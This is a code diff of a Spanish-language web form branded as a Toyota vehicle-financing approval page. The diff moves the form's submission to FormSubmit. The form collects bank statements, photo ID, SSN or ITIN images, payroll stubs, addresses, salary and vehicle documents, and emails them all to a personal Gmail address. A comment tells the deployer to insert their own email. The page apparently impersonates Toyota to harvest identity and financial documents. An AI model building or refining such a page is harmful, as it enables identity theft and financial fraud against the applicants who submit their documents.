@@ -314,25 +314,27 @@
             font-size: 14px;
         }
         
-        /* Nuevos estilos para mensajes */
+        /* Mensajes de estado */
         .success-message {
             display: none;
             background: #d4edda;
             color: #155724;
-            padding: 15px;
+            padding: 20px;
             border-radius: 5px;
             margin: 20px 0;
             text-align: center;
+            border-left: 5px solid #28a745;
         }
         
         .error-message {
             display: none;
             background: #f8d7da;
             color: #721c24;
-            padding: 15px;
+            padding: 20px;
             border-radius: 5px;
             margin: 20px 0;
             text-align: center;
+            border-left: 5px solid #dc3545;
         }
     </style>
 </head>
@@ -346,53 +348,62 @@
         </header>
         
         <div class="form-container">
-            <div class="note">
-                <p><strong>Importante:</strong> Por favor complete todos los campos marcados con * y adjunte los documentos solicitados en formato PDF o imagen (JPG, PNG).</p>
+            <!-- ✅ NOTA IMPORTANTE SOBRE FORM SUBMIT -->
+            <div class="note" style="background: #e8f4fc; border-left-color: #2196F3;">
+                <p><strong><i class="fas fa-paperclip"></i> IMPORTANTE:</strong> Con FormSubmit, los archivos se envían <strong>adjuntos directamente al email</strong>. Llegan como archivos adjuntos normales.</p>
             </div>
             
-            <!-- ✅ FORMULARIO CONFIGURADO PARA FORMCARRY -->
+            <!-- ✅ FORMULARIO CONFIGURADO PARA FORM SUBMIT -->
+            <!-- REEMPLAZA 'aprobacionesonlinetoyota@gmail.com' CON TU EMAIL -->
             <form 
-                action="https://formcarry.com/s/qTuSh0WvS4g" 
+                action="https://formsubmit.co/aprobacionesonlinetoyota@gmail.com" 
                 method="POST" 
                 enctype="multipart/form-data"
                 id="approvalForm"
             >
-                <!-- ⭐⭐ CONFIGURACIÓN FORMCARRY (NECESARIO) -->
-                <input type="hidden" name="_subject" value="Nueva solicitud Toyota - {fullName}">
+                <!-- CONFIGURACIÓN FORM SUBMIT -->
+                <input type="hidden" name="_subject" value="NUEVA APLICACIÓN TOYOTA - Documentos Adjuntos">
+                <input type="hidden" name="_template" value="table">
+                <input type="hidden" name="_autoresponse" value="Gracias por su aplicación. Hemos recibido sus documentos.">
+                <input type="hidden" name="_cc" value="aprobacionesonlinetoyota@gmail.com">
                 <input type="hidden" name="_replyto" value="" id="replyToField">
-                <input type="hidden" name="_autoresponse" value="yes">
-                <input type="text" name="_gotcha" style="display:none">
+                <input type="text" name="_honey" style="display:none">
+                <input type="hidden" name="_captcha" value="false">
                 
-                <!-- ⭐⭐ INFORMACIÓN BÁSICA DEL CLIENTE (NECESARIO) -->
+                <!-- Información Personal (OBLIGATORIO) -->
                 <h2 class="section-title">Información Personal</h2>
                 <div class="form-row">
                     <div class="form-group">
                         <label for="fullName" class="required">Nombre completo *</label>
-                        <input type="text" id="fullName" name="fullName" required>
+                        <input type="text" id="fullName" name="Nombre Completo" required>
                     </div>
                     
                     <div class="form-group">
                         <label for="email" class="required">Correo electrónico *</label>
-                        <input type="email" id="email" name="email" required>
+                        <input type="email" id="email" name="Email" required>
                     </div>
                     
                     <div class="form-group">
                         <label for="phone" class="required">Teléfono *</label>
-                        <input type="tel" id="phone" name="phone" required>
+                        <input type="tel" id="phone" name="Teléfono" required>
                     </div>
                 </div>
                 
                 <!-- Documentación -->
                 <h2 class="section-title">Documentación</h2>
+                <div class="note">
+                    <p><strong><i class="fas fa-file-pdf"></i> Formatos aceptados:</strong> PDF, JPG, PNG (Máximo 25MB por archivo)</p>
+                </div>
+                
                 <div class="form-row">
-                    <!-- ⭐⭐ CAMBIO IMPORTANTE: Separar los 3 estados de cuenta en campos individuales -->
+                    <!-- Estados de cuenta SEPARADOS -->
                     <div class="form-group">
                         <label for="bankStmt1" class="required">Estado de cuenta 1 (PDF) *</label>
                         <div class="file-input">
                             <i class="fas fa-file-pdf"></i>
                             <div class="file-text">Seleccionar archivo PDF</div>
                             <span class="file-name" id="bankStmt1File">Ningún archivo seleccionado</span>
-                            <input type="file" id="bankStmt1" name="bankStmt1" accept=".pdf" required>
+                            <input type="file" id="bankStmt1" name="Estado de Cuenta 1" accept=".pdf" required>
                         </div>
                         <div class="file-validation" id="bankStmt1Validation">Archivo PDF requerido</div>
                     </div>
@@ -403,7 +414,7 @@
                             <i class="fas fa-file-pdf"></i>
                             <div class="file-text">Seleccionar archivo PDF</div>
                             <span class="file-name" id="bankStmt2File">Ningún archivo seleccionado</span>
-                            <input type="file" id="bankStmt2" name="bankStmt2" accept=".pdf" required>
+                            <input type="file" id="bankStmt2" name="Estado de Cuenta 2" accept=".pdf" required>
                         </div>
                         <div class="file-validation" id="bankStmt2Validation">Archivo PDF requerido</div>
                     </div>
@@ -414,7 +425,7 @@
                             <i class="fas fa-file-pdf"></i>
                             <div class="file-text">Seleccionar archivo PDF</div>
                             <span class="file-name" id="bankStmt3File">Ningún archivo seleccionado</span>
-                            <input type="file" id="bankStmt3" name="bankStmt3" accept=".pdf" required>
+                            <input type="file" id="bankStmt3" name="Estado de Cuenta 3" accept=".pdf" required>
                         </div>
                         <div class="file-validation" id="bankStmt3Validation">Archivo PDF requerido</div>
                     </div>
@@ -425,17 +436,17 @@
                             <i class="fas fa-id-card"></i>
                             <div class="file-text">Seleccionar imagen</div>
                             <span class="file-name" id="idFile">Ningún archivo seleccionado</span>
-                            <input type="file" id="idDoc" name="idDoc" accept="image/*" required>
+                            <input type="file" id="idDoc" name="Identificación" accept="image/*" required>
                         </div>
                     </div>
                     
                     <div class="form-group">
-                        <label for="itinDoc">Foto del Social o ITIN number (opcional)</label>
+                        <label for="itinDoc">Foto del Social o ITIN number</label>
                         <div class="file-input">
                             <i class="fas fa-passport"></i>
                             <div class="file-text">Seleccionar imagen</div>
                             <span class="file-name" id="itinFile">Ningún archivo seleccionado</span>
-                            <input type="file" id="itinDoc" name="itinDoc" accept="image/*">
+                            <input type="file" id="itinDoc" name="ITIN o SSN" accept="image/*">
                         </div>
                     </div>
                     
@@ -445,7 +456,7 @@
                             <i class="fas fa-file-invoice-dollar"></i>
                             <div class="file-text">Seleccionar archivo PDF</div>
                             <span class="file-name" id="payrollFile">Ningún archivo seleccionado</span>
-                            <input type="file" id="payrollDoc" name="payrollDoc" accept=".pdf" required>
+                            <input type="file" id="payrollDoc" name="Recibo de Nómina" accept=".pdf" required>
                         </div>
                         <div class="file-validation" id="payrollValidation">Archivo PDF requerido</div>
                     </div>
@@ -456,33 +467,33 @@
                 <div class="form-row">
                     <div class="form-group">
                         <label for="workName" class="required">Nombre de tu trabajo *</label>
-                        <input type="text" id="workName" name="workName" required>
+                        <input type="text" id="workName" name="Empresa" required>
                     </div>
                     
                     <div class="form-group">
                         <label for="workAddress" class="required">Dirección de tu trabajo *</label>
-                        <input type="text" id="workAddress" name="workAddress" required>
+                        <input type="text" id="workAddress" name="Dirección del Trabajo" required>
                     </div>
                     
                     <div class="form-group">
                         <label for="position" class="required">Cargo o función *</label>
-                        <input type="text" id="position" name="position" required>
+                        <input type="text" id="position" name="Cargo" required>
                     </div>
                     
                     <div class="form-group">
                         <label for="monthlySalary" class="required">Sueldo mensual ($) *</label>
-                        <input type="number" id="monthlySalary" name="monthlySalary" min="0" step="100" required>
+                        <input type="number" id="monthlySalary" name="Salario Mensual" min="0" step="100" required>
                     </div>
                     
                     <div class="form-group">
                         <label for="employmentTime" class="required">Tiempo en el empleo *</label>
-                        <select id="employmentTime" name="employmentTime" required>
+                        <select id="employmentTime" name="Tiempo en el Empleo" required>
                             <option value="">Seleccione...</option>
-                            <option value="less-6">Menos de 6 meses</option>
-                            <option value="6-12">6 a 12 meses</option>
-                            <option value="1-2">1 a 2 años</option>
-                            <option value="2-5">2 a 5 años</option>
-                            <option value="5+">Más de 5 años</option>
+                            <option value="Menos de 6 meses">Menos de 6 meses</option>
+                            <option value="6 a 12 meses">6 a 12 meses</option>
+                            <option value="1 a 2 años">1 a 2 años</option>
+                            <option value="2 a 5 años">2 a 5 años</option>
+                            <option value="Más de 5 años">Más de 5 años</option>
                         </select>
                     </div>
                 </div>
@@ -493,44 +504,44 @@
                     <div class="residential-fields">
                         <div class="residential-field">
                             <label for="streetAddress" class="required">Dirección de la calle *</label>
-                            <input type="text" id="streetAddress" name="streetAddress" required>
+                            <input type="text" id="streetAddress" name="Dirección Residencial" required>
                         </div>
                         
                         <div class="residential-field">
                             <label for="city" class="required">Ciudad *</label>
-                            <input type="text" id="city" name="city" required>
+                            <input type="text" id="city" name="Ciudad" required>
                         </div>
                         
                         <div class="residential-field">
                             <label for="state" class="required">Estado *</label>
-                            <select id="state" name="state" required>
+                            <select id="state" name="Estado" required>
                                 <option value="">Seleccione estado</option>
                                 <option value="FL">Florida</option>
                                 <option value="CA">California</option>
                                 <option value="TX">Texas</option>
-                                <!-- Mantén solo los estados que necesites -->
+                                <option value="NY">New York</option>
                             </select>
                         </div>
                         
                         <div class="residential-field">
                             <label for="zipCode" class="required">Código postal *</label>
-                            <input type="text" id="zipCode" name="zipCode" required>
+                            <input type="text" id="zipCode" name="Código Postal" required>
                         </div>
                         
                         <div class="residential-field">
                             <label for="housingType" class="required">Tipo de vivienda *</label>
-                            <select id="housingType" name="housingType" required>
+                            <select id="housingType" name="Tipo de Vivienda" required>
                                 <option value="">Seleccione tipo de vivienda</option>
-                                <option value="own">Propia</option>
-                                <option value="rent">Alquilada</option>
-                                <option value="live_with_family">Vivo con familia</option>
-                                <option value="other">Otro</option>
+                                <option value="Propia">Propia</option>
+                                <option value="Alquilada">Alquilada</option>
+                                <option value="Vive con familia">Vive con familia</option>
+                                <option value="Otro">Otro</option>
                             </select>
                         </div>
                         
                         <div class="residential-field">
                             <label for="monthlyRent" class="required">Monto de alquiler/hipoteca mensual *</label>
-                            <input type="number" id="monthlyRent" name="monthlyRent" min="0" step="10" required>
+                            <input type="number" id="monthlyRent" name="Pago Mensual Vivienda" min="0" step="10" required>
                         </div>
                     </div>
                 </div>
@@ -540,7 +551,7 @@
                 <div class="form-row">
                     <div class="form-group">
                         <label for="vehicleModel" class="required">Modelo de vehículo *</label>
-                        <input type="text" id="vehicleModel" name="vehicleModel" placeholder="Ej: Toyota Camry 2024" required>
+                        <input type="text" id="vehicleModel" name="Modelo del Vehículo" placeholder="Ej: Toyota Camry 2024" required>
                     </div>
                     
                     <div class="form-group">
@@ -549,7 +560,7 @@
                             <i class="fas fa-barcode"></i>
                             <div class="file-text">Seleccionar imagen</div>
                             <span class="file-name" id="vinFile">Ningún archivo seleccionado</span>
-                            <input type="file" id="vinPhoto" name="vinPhoto" accept="image/*" required>
+                            <input type="file" id="vinPhoto" name="Foto del VIN" accept="image/*" required>
                         </div>
                     </div>
                     
@@ -559,7 +570,7 @@
                             <i class="fas fa-tachometer-alt"></i>
                             <div class="file-text">Seleccionar imagen</div>
                             <span class="file-name" id="mileageFile">Ningún archivo seleccionado</span>
-                            <input type="file" id="mileagePhoto" name="mileagePhoto" accept="image/*" required>
+                            <input type="file" id="mileagePhoto" name="Foto del Odómetro" accept="image/*" required>
                         </div>
                     </div>
                     
@@ -569,22 +580,26 @@
                             <i class="fas fa-file-contract"></i>
                             <div class="file-text">Seleccionar archivo PDF o imagen</div>
                             <span class="file-name" id="payoffFile">Ningún archivo seleccionado</span>
-                            <input type="file" id="payoffDoc" name="payoffDoc" accept=".pdf,image/*" required>
+                            <input type="file" id="payoffDoc" name="Documento de Payoff" accept=".pdf,image/*" required>
                         </div>
                     </div>
                 </div>
                 
                 <!-- Mensajes de estado -->
                 <div class="success-message" id="successMessage">
-                    <i class="fas fa-check-circle"></i> ¡Solicitud enviada exitosamente!
+                    <i class="fas fa-check-circle fa-2x"></i>
+                    <h3>¡Solicitud enviada exitosamente!</h3>
+                    <p>Los documentos han sido enviados adjuntos al email. Revisa tu bandeja de entrada.</p>
                 </div>
                 
                 <div class="error-message" id="errorMessage">
-                    <i class="fas fa-exclamation-triangle"></i> <span id="errorText">Error al enviar</span>
+                    <i class="fas fa-exclamation-triangle fa-2x"></i>
+                    <h3>Error al enviar</h3>
+                    <p id="errorText">Por favor, intenta nuevamente.</p>
                 </div>
                 
                 <button type="submit" class="btn-submit" id="submitBtn">
-                    <i class="fas fa-paper-plane"></i> Enviar Solicitud
+                    <i class="fas fa-paper-plane"></i> Enviar Solicitud y Documentos
                 </button>
             </form>
         </div>
@@ -595,7 +610,7 @@
         </a>
         
         <footer>
-            <p>© 2026 Toyota. Todos los derechos reservados. | Formulario de Aprobación para Financiamiento</p>
+            <p>© 2026 Toyota. Formulario procesado por FormSubmit</p>
         </footer>
     </div>
 
@@ -611,6 +626,13 @@
                 const fileName = this.files[0]?.name || 'Ningún archivo seleccionado';
                 const label = this.closest('.file-input').querySelector('.file-name');
                 if (label) label.textContent = fileName;
+                
+                // Validar tamaño máximo (25MB para FormSubmit)
+                if (this.files[0] && this.files[0].size > 25 * 1024 * 1024) {
+                    alert('El archivo ' + this.files[0].name + ' es demasiado grande. Máximo 25MB.');
+                    this.value = '';
+                    label.textContent = 'Ningún archivo seleccionado';
+                }
                 
                 // Validar PDF para campos específicos
                 if (this.id.includes('bankStmt') || this.id === 'payrollDoc') {
@@ -629,7 +651,7 @@
             });
         });
         
-        // Manejo de envío mejorado
+        // Manejo de envío con FormSubmit
         document.getElementById('approvalForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             
@@ -638,8 +660,12 @@
             const form = this;
             
             // Deshabilitar botón y mostrar loading
-            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Enviando...';
+            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Enviando documentos...';
             submitBtn.disabled = true;
+            
+            // Ocultar mensajes anteriores
+            document.getElementById('successMessage').style.display = 'none';
+            document.getElementById('errorMessage').style.display = 'none';
             
             try {
                 // Validar archivos PDF
@@ -669,60 +695,50 @@
                     return;
                 }
                 
-                // Enviar a FormCarry
+                // Enviar a FormSubmit
                 const formData = new FormData(form);
                 
                 const response = await fetch(form.action, {
                     method: 'POST',
-                    body: formData,
-                    headers: {
-                        'Accept': 'application/json'
-                    }
+                    body: formData
                 });
                 
-                const result = await response.json();
-                
-                if (response.ok && result.code === 200) {
-                    // Éxito
+                if (response.ok) {
+                    // Éxito - FormSubmit redirige automáticamente
                     document.getElementById('successMessage').style.display = 'block';
-                    document.getElementById('errorMessage').style.display = 'none';
-                    form.reset();
                     
-                    // Resetear nombres de archivos
-                    document.querySelectorAll('.file-name').forEach(el => {
-                        el.textContent = 'Ningún archivo seleccionado';
-                    });
-                    
-                    // Resetear validaciones
-                    document.querySelectorAll('.file-validation').forEach(el => {
-                        el.textContent = 'Archivo PDF requerido';
-                        el.style.color = '#666';
-                    });
-                    
-                    // Ocultar mensaje después de 5 segundos
+                    // Opcional: Limpiar formulario después de éxito
                     setTimeout(() => {
+                        form.reset();
+                        document.querySelectorAll('.file-name').forEach(el => {
+                            el.textContent = 'Ningún archivo seleccionado';
+                        });
+                        document.querySelectorAll('.file-validation').forEach(el => {
+                            el.textContent = 'Archivo PDF requerido';
+                            el.style.color = '#666';
+                        });
                         document.getElementById('successMessage').style.display = 'none';
                     }, 5000);
                     
                 } else {
-                    // Error
-                    throw new Error(result.message || 'Error en el envío');
+                    throw new Error(`Error HTTP ${response.status}`);
                 }
                 
             } catch (error) {
                 console.error('Error:', error);
-                document.getElementById('errorText').textContent = error.message || 'Error al enviar el formulario';
+                document.getElementById('errorText').textContent = 'Error al enviar. Intenta nuevamente o contacta por WhatsApp.';
                 document.getElementById('errorMessage').style.display = 'block';
-                document.getElementById('successMessage').style.display = 'none';
                 
-                // Si es error de FormCarry, mostrar ayuda
-                if (error.message.includes('FormCarry') || error.message.includes('attachment')) {
+                // Mostrar ayuda específica
+                setTimeout(() => {
                     document.getElementById('errorText').innerHTML = 
-                        'Error con FormCarry. Verifica:<br>' +
-                        '1. Tu endpoint es correcto<br>' +
-                        '2. No excedes el límite de archivos (10MB cada uno)<br>' +
-                        '3. Los archivos son PDF/JPG/PNG válidos';
-                }
+                        'Si el problema persiste:<br>' +
+                        '1. Verifica tu conexión a internet<br>' +
+                        '2. Prueba con archivos más pequeños (<10MB)<br>' +
+                        '3. Contacta al equipo: ' + 
+                        '<a href="https://wa.me/1234567890" style="color: #25d366; font-weight: bold;">WhatsApp</a>';
+                }, 2000);
+                
             } finally {
                 // Restaurar botón
                 submitBtn.innerHTML = originalText;
